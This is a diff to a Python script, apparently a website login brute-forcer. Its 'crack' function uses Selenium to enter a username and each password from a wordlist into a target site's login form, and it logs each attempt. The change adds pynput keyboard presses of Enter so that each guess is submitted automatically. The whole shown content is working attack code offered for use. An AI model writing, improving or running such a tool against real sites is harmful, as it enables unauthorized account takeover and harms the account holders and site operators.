@@ -5,6 +5,7 @@ import requests # Handling HTTP requests
 from sys import stdout # For Prompts
 from selenium import webdriver # Used to control the browser
 from optparse import OptionParser # For argument support
+from pynput.keyboard import Key, Controller # Used to press enter
 
 
 # Fancy colors
@@ -107,6 +108,8 @@ def crack(username, usersel, passsel, passlist, website):
             Sel_pass = browser.find_element_by_css_selector(passsel)
             Sel_user.send_keys(username) # Enter username
             Sel_pass.send_keys(password) # Enter password
+            keyboard.press(Key.enter)
+            keyboard.release(Key.enter) # Enter information
             tried = password
             print(color.GREEN + 'Tried: ' + color.WHITE + tried) # Log last tried password
         print(color.RED + '\n[!] '+color.WHITE + 'Sorry, password could not be found') # Message for if the password list is over and the password was not found
